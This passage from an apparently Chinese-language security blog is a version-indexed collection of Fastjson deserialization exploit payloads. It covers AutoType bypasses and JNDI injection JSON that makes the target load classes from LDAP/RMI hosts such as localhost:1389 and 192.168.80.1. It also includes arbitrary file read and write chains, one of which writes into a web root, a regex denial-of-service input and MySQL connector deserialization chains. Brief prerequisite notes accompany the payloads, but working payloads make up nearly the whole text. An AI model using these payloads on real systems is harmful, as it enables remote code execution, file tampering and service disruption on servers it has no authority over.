id="Fastjson-1-2-25-1-2-43"><a href="#Fastjson-1-2-25-1-2-43" class="headerlink" title="Fastjson 1.2.25-1.2.43"></a>Fastjson 1.2.25-1.2.43</h3><p>exp</p><p>条件需要开启autotype</p><p>加[{绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;badNameClass&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson-1-2-25-1-2-45"><a href="#Fastjson-1-2-25-1-2-45" class="headerlink" title="Fastjson 1.2.25-1.2.45"></a>Fastjson 1.2.25-1.2.45</h3><p>条件需要开启autotype</p><p>45把之前问题修了，但是可以借助第三方组件绕过。</p><p>需要mybatis，且版本需为3.x.x系列&lt;3.5.0的版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;badNameClass&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson1-2-25-1-2-47通杀"><a href="#Fastjson1-2-25-1-2-47通杀" class="headerlink" title="Fastjson1.2.25-1.2.47通杀"></a>Fastjson1.2.25-1.2.47通杀</h3><p>借助缓存进行通杀，缓存在1.2.48被改为默认关闭</p><p>漏洞原理是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测</p><p>这里有两大版本范围：</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li></ul><p>poc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;badNameClass&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1.2.48之后版本，小弟水平有限还未复现研究，payload需要注意的细节还未探索</strong></p><h3 id="Fastjson-1-2-36-1-2-62"><a href="#Fastjson-1-2-36-1-2-62" class="headerlink" title="Fastjson 1.2.36 - 1.2.62"></a>Fastjson 1.2.36 - 1.2.62</h3><p>正则表达式拒绝服务漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;regex&quot;:&#123;</span><br><span class="line">        &quot;$ref&quot;:&quot;$[\blue &#x3D; &#x2F;\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$&#x2F;]&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;blue&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;regex&quot;:&#123;</span><br><span class="line">        &quot;$ref&quot;:&quot;$[blue rlike &#39;^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$&#39;]&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;blue&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-lt-1-2-59"><a href="#Fastjson1-2-5-lt-1-2-59" class="headerlink" title="Fastjson1.2.5 &lt;= 1.2.59"></a>Fastjson1.2.5 &lt;= 1.2.59</h3><p><strong>需要开启AutoType</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-lt-1-2-60"><a href="#Fastjson1-2-5-lt-1-2-60" class="headerlink" title="Fastjson1.2.5 &lt;= 1.2.60"></a>Fastjson1.2.5 &lt;= 1.2.60</h3><p><strong>无需开启 autoType：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&quot;xaDataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;10.10.20.166:1099&#x2F;ExportObject&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap:&#x2F;&#x2F;10.10.20.166:1389&#x2F;ExportObject&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-lt-1-2-61"><a href="#Fastjson1-2-5-lt-1-2-61" class="headerlink" title="Fastjson1.2.5 &lt;= 1.2.61"></a>Fastjson1.2.5 &lt;= 1.2.61</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;,&quot;Object&quot;:&quot;a&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson-lt-1-2-62"><a href="#Fastjson-lt-1-2-62" class="headerlink" title="Fastjson &lt;1.2.62"></a>Fastjson &lt;1.2.62</h3><ul><li>需要开启AutoType；</li><li>Fastjson &lt;= 1.2.62；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>目标服务端需要存在xbean-reflect包；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1098&#x2F;exploit&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>开启AutoType；</li><li>Fastjson &lt;= 1.2.66；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li><li>br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1389&#x2F;Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap:&#x2F;&#x2F;192.168.80.1:1399&#x2F;Calc&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>适用于jdk11以上版本的写文件的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">    &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;,</span><br><span class="line">    &quot;out&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">           &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,</span><br><span class="line">           &quot;file&quot;: &quot;&#x2F;tmp&#x2F;asdasd&quot;,</span><br><span class="line">           &quot;append&quot;: true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;infl&quot;: &#123;</span><br><span class="line">           &quot;input&quot;: &#123;</span><br><span class="line">               &quot;array&quot;: &quot;eJxLLE5JTCkGAAh5AnE&#x3D;&quot;,</span><br><span class="line">               &quot;limit&quot;: 14</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;bufLen&quot;: &quot;100&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;protocolVersion&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson-lt-1-2-67"><a href="#fastjson-lt-1-2-67" class="headerlink" title="fastjson&lt;=1.2.67"></a>fastjson&lt;=1.2.67</h3><h3 id="前提条件-1"><a href="#前提条件-1" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>开启AutoType；</li><li>Fastjson &lt;= 1.2.67；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson-lt-1-2-68"><a href="#fastjson-lt-1-2-68" class="headerlink" title="fastjson&lt;=1.2.68"></a>fastjson&lt;=1.2.68</h3><ul><li>Fastjson &lt;= 1.2.68；</li><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;vul.VulAutoCloseable&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125;</span><br></pre></td></tr></table></figure><p>读文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;C:&#x2F;Windows&#x2F;win.ini&quot;, &quot;targetPath&quot;:&quot;D:&#x2F;wamp64&#x2F;www&#x2F;win.txt&quot;&#125;</span><br></pre></td></tr></table></figure><p>写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">  &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,</span><br><span class="line">  &quot;file&quot;: &quot;&#x2F;tmp&#x2F;nonexist&quot;,</span><br><span class="line">  &quot;append&quot;: &quot;false&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">  &quot;@type&quot;: &quot;java.io.FileWriter&quot;,</span><br><span class="line">  &quot;file&quot;: &quot;&#x2F;tmp&#x2F;nonexist&quot;,</span><br><span class="line">  &quot;append&quot;: &quot;false&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br><span class="line">        &quot;targetPath&quot;: &quot;D:&#x2F;wamp64&#x2F;www&#x2F;hacked.txt&quot;,</span><br><span class="line">        &quot;tempPath&quot;: &quot;D:&#x2F;wamp64&#x2F;www&#x2F;test.txt&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br><span class="line">        &quot;buffer&quot;: &quot;cHduZWQ&#x3D;&quot;,</span><br><span class="line">        &quot;outputStream&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;position&quot;: 5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;stream&#39;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#39;@type&#39;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &#39;@type&#39;:&#39;java.io.FileOutputStream&#39;,</span><br><span class="line">        &#39;file&#39;:&#39;&#x2F;tmp&#x2F;nonexist&#39;,</span><br><span class="line">        &#39;append&#39;:false</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;writer&#39;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#39;@type&#39;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &#39;@type&#39;:&#39;org.apache.solr.common.util.FastOutputStream&#39;,</span><br><span class="line">        &#39;tempBuffer&#39;:&#39;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4&#x3D;&#39;,</span><br><span class="line">        &#39;sink&#39;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#39;$ref&#39;:&#39;$.stream&#39;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#39;start&#39;:38</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;close&#39;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#39;@type&#39;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &#39;@type&#39;:&#39;org.iq80.snappy.SnappyOutputStream&#39;,</span><br><span class="line">        &#39;out&#39;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#39;$ref&#39;:&#39;$.writer&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>适用于jdk8/10的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">  &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;,</span><br><span class="line">  &quot;out&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;,</span><br><span class="line">    &quot;out&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,</span><br><span class="line">      &quot;file&quot;: &quot;dst&quot;,</span><br><span class="line">      &quot;append&quot;: &quot;false&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;infl&quot;: &#123;</span><br><span class="line">      &quot;input&quot;: &quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw&#x3D;&#x3D;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;bufLen&quot;: 1048576</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;protocolVersion&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jdk 8</p><ul><li>position写入的长度，必须和base64编码前的长度一致。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br><span class="line">        &quot;targetPath&quot;: &quot;f:&#x2F;pwn.txt&quot;,</span><br><span class="line">        &quot;tempPath&quot;: &quot;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br><span class="line">        &quot;buffer&quot;: &quot;YjF1M3I&#x3D;&quot;,</span><br><span class="line">        &quot;outputStream&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;position&quot;: 5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2021黑帽大会腾讯玄武披露<br>详细漏洞原理待研究<br><a href="https://b1ue.cn/archives/506.html">https://b1ue.cn/archives/506.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Mysqlconnector 5.1.x</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;mysql.host&quot;,&quot;portToConnectTo&quot;:3306,&quot;info&quot;:&#123;&quot;user&quot;:”user&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;,&quot;NUM_HOSTS&quot;: &quot;1&quot;&#125;,&quot;databaseToConnectTo&quot;:&quot;dbname&quot;,&quot;url&quot;:&quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line">Mysqlconnector 6.0.2 or 6.0.3</span><br><span class="line">&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,&quot;proxy&quot;:&#123;&quot;connectionString&quot;:&#123;&quot;url&quot;: &quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;foo?allowLoadLocalInfile&#x3D;true&quot;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">Mysqlconnector 6.x or &lt; 8.0.20</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,&quot;proxy&quot;:&#123;&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,&quot;connectionUrl&quot;:&#123;&quot;@type&quot;:&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;, &quot;masters&quot;: [&#123;&quot;host&quot;:&quot;mysql.host&quot;&#125;], &quot;slaves&quot;:[], &quot;properties&quot;:&#123;&quot;host&quot;:&quot;mysql.host&quot;,&quot;user&quot;:&quot;user&quot;,&quot;dbname&quot;:&quot;dbname&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;queryInterceptors&quot;:&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson未知版本"><a href="#fastjson未知版本" class="headerlink" title="fastjson未知版本"></a>fastjson未知版本</h3><p>待探索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&quot;, &quot;tmJndiName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;, &quot;tmFromJndi&quot;: true, &quot;transactionManager&quot;: &#123;&quot;$ref&quot;:&quot;$.transactionManager&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&quot;, &quot;tmJndiName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;, &quot;tmFromJndi&quot;: true, &quot;transactionManager&quot;: &#123;&quot;$ref&quot;:&quot;$.transactionManager&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="环境-amp-工具"><a href="#环境-amp-工具" class="headerlink" 